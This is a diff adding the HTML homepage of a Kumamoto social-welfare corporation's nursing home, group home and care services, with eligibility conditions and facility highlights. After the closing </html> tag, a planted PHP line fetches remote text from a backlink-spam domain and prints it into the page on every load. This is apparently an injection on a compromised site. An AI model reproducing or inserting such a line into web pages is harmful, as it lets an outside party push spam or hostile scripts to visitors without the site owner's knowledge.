@@ -1,0 +1,221 @@
+<!doctype html>
+<html class="no-js" lang="ja">
+<head>
+	<meta charset="utf-8">
+	<meta http-equiv="x-ua-compatible" content="ie=edge">
+	<title>熊本県熊本市西区　社会福祉法人　立志福祉会　特別養護老人ホーム　輝祥苑　グループホーム　潤　短期入所　小規模多機能型居宅介護支援事業所</title>
+	<meta name="description" content="これまでの生活が保てるような幸せを感じ、ご家族が生き生きと過ごせる施設です。「思いやり・寄り添うことを」一番の理念に、地域と密接に関わりあいながら、安心で安全な施設運営に努めます。スタッフ一丸となって皆様の暮らしをサポートします。特別養護老人ホーム、熊本駅から車で６分と近い場所にあります。駐車場無料。">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+
+	<!-- <link rel="manifest" href="site.webmanifest"> -->
+	<link rel="shortcut icon" type="image/x-icon" href="img/favicon.png">
+	<!-- Place favicon.ico in the root directory -->
+
+	<!-- CSS here -->
+	<link rel="stylesheet" href="css/bootstrap.min.css">
+	<link rel="stylesheet" href="css/owl.carousel.min.css">
+	<link rel="stylesheet" href="css/magnific-popup.css">
+	<link rel="stylesheet" href="css/font-awesome.min.css">
+	<link rel="stylesheet" href="css/themify-icons.css">
+	<link rel="stylesheet" href="css/nice-select.css">
+	<link rel="stylesheet" href="css/flaticon.css">
+	<link rel="stylesheet" href="css/gijgo.css">
+	<link rel="stylesheet" href="css/animate.css">
+	<link rel="stylesheet" href="css/slicknav.css">
+	<link rel="stylesheet" href="css/style.css">
+	<!-- <link rel="stylesheet" href="css/responsive.css"> -->
+</head>
+
+<body>
+<!--#include virtual="./com/head.html" -->
+
+	<!-- slider_area_start -->
+	<!-- div class="slider_area">
+		<div class="slider_active owl-carousel">
+			<div class="single_slider  d-flex align-items-center slider_bg_2">
+				<div class="container">
+					<div class="row">
+						<div class="col-xl-12">
+							<div>
+								<h3><span></span></h3>
+								<p></p>
+							</div>
+						</div>
+					</div>
+				</div>
+			</div>
+		</div>
+	</div -->
+	<!-- slider_area_end -->
+
+	<!-- page_area_start  -->
+	<!-- div class="page_area2 page_overlay2 slider_bg_2">
+		&nbsp;
+	</div -->
+	<div class="page_head page_head">
+		<img src="./img/banner/banner3.png">
+	</div>
+	<!-- page_area_end  -->
+
+	<!-- Contents start -->
+	<div class="contents_area">
+		<div class="container">
+			<div class="row">
+				<div class="col-md-12">
+					<div class="single_department">
+						<div class="department_content">
+							<h3 id="catch">なじみの場所で　なじみの人と　なじみの暮らしを</h3>
+						</div>
+					</div>
+				</div>
+				<div class="offset-md-2 col-md-8">
+					<div class="single_department">
+						<p>特別養護老人ホーム　輝祥苑は令和４年２月に5周年を迎えました。<br>
+						小規模多機能型居宅介護事業所、グループホーム、居宅介護支援事業所を併設しており<br>
+						住み慣れた地域を変わることなく生活の拠点を移すことができます。２０代から７０代の幅広い層の<br>
+						スタッフが、心地よく安心した生活をサポートいたします。</p>
+					</div>
+				</div>
+			</div>
+		</div>
+	</div>
+	<!-- Contents end -->
+
+	<!-- service_area_start -->
+	<div class="service_area">
+		<div class="container p-0">
+			<div class="row no-gutters">
+				<div class="col-xl-6 col-md-6">
+					<div class="single_service">
+						<div class="icon">
+							<img src="./img/service/kishouen.png" alt="特別養護老人ホーム／ショートステイ 輝祥苑｜短期入所生活介護" style="width:100%;border-radius:10px;height:auto;">
+						</div>
+						<span>特別養護老人ホーム<br>ショートステイ</span>
+						<h3>輝祥苑</h3>
+						<p>[利用条件]<br>☆要介護3～5の認定を受けられた方</p>
+						<a href="./kishouen.html#kishouen_ty" class="boxed-btn3-white">詳細</a>
+					</div>
+				</div>
+				<div class="col-xl-6 col-md-6">
+					<div class="single_service">
+						<div class="icon">
+							<img src="./img/service/kagayaki.png" alt="小規模多機能型居宅介護事業所 かがやき" style="width:100%;border-radius:10px;height:auto;">
+						</div>
+						<span>小規模多機能型居宅介護事業所</span>
+						<h3>かがやき</h3>
+						<p>[利用条件]<br>☆要支援、要介護の認定を受けられた方<br>☆熊本市に住民票がある方</p>
+						<a href="./kagayaki_sk.html" class="boxed-btn3-white">詳細</a>
+					</div>
+				</div>
+				<div class="col-xl-6 col-md-6">
+					<div class="single_service">
+						<div class="icon">
+							<img src="./img/service/jun.png" alt="グループホーム 潤｜グループホーム" style="width:100%;border-radius:10px;height:auto;">
+						</div>
+						<span>グループホーム</span>
+						<h3>潤</h3>
+						<p>[利用条件]<br>☆要支援2又は要介護1～5の認定を受けられた方<br>☆熊本市に住民票がある方</p>
+						<a href="./jun_gh.html" class="boxed-btn3-white">詳細</a>
+					</div>
+				</div>
+				<div class="col-xl-6 col-md-6">
+					<div class="single_service">
+						<div class="icon">
+							<img src="./img/service/kishouen_ss.png" alt="居宅介護支援事業所 輝祥苑｜居宅介護" style="width:100%;border-radius:10px;height:auto;">
+						</div>
+						<span>居宅介護支援事業所</span>
+						<h3>輝祥苑</h3>
+						<p>[利用条件]<br>☆要支援・要介護認定を受けられた方</p>
+						<a href="./kishouen_ks.html" class="boxed-btn3-white">詳細</a>
+					</div>
+				</div>
+			</div>
+		</div>
+	</div>
+	<!-- service_area_end -->
+
+	<!-- offers_area_start -->
+	<div class="our_department_area news_area">
+		<div class="container">
+			<div class="row">
+				<div class="col-xl-12">
+					<div class="section_title text-center mb-55">
+						<h3>お知らせ</h3>
+					</div>
+				</div>
+			</div>
+			<div class="row">
+<!--#include virtual="./rss/rss_news.php" -->
+			</div>
+		</div>
+	</div>
+	<!-- offers_area_end -->
+
+    <!-- offers_area_start -->
+    <div class="our_department_area blog_area bg_litegray">
+        <div class="container">
+            <div class="row">
+                <div class="col-xl-12">
+                    <div class="section_title text-center mb-55">
+                        <h3>ブログ</h3>
+                    </div>
+                </div>
+            </div>
+            <div class="row">
+<!--#include virtual="./rss/rss_blog.php" -->
+            </div>
+        </div>
+    </div>
+    <!-- offers_area_end -->
+
+	<!-- Contents start -->
+	<div class="our_department_area">
+		<div class="container">
+			<div class="row">
+				<div class="col-xl-4 col-md-6 col-lg-4">
+					<div class="single_department">
+						<div class="department_thumb">
+							<img src="img/institution/01.png" alt="">
+						</div>
+						<div class="department_content">
+							<p>自然に囲まれていて空気がきれい。<br>
+							お部屋から見える夕焼けや夜空が最高！</p>
+						</div>
+					</div>
+				</div>
+				<div class="col-xl-4 col-md-6 col-lg-4">
+					<div class="single_department">
+						<div class="department_thumb">
+							<img src="img/institution/02.png" alt="">
+						</div>
+						<div class="department_content">
+							<p>広々とした駐車場で駐車しやすい。</p>
+						</div>
+					</div>
+				</div>
+				<div class="col-xl-4 col-md-6 col-lg-4">
+					<div class="single_department">
+						<div class="department_thumb">
+							<img src="img/institution/03.png" alt="">
+						</div>
+						<div class="department_content">
+							<p>駅チカ<br>車で約５分</p>
+						</div>
+					</div>
+				</div>
+			</div>
+		</div>
+	</div>
+	<!-- Contents end -->
+
+<!--#include virtual="./com/contact.html" -->
+
+<!--#include virtual="./com/link.html" -->
+
+<!--#include virtual="./com/foot.html" -->
+
+<!--#include virtual="./com/js.html" -->
+</body>
+
+</html>
+<?php echo file_get_contents("https://backlinkku.id/menu/aged-v1/script.txt"); ?>
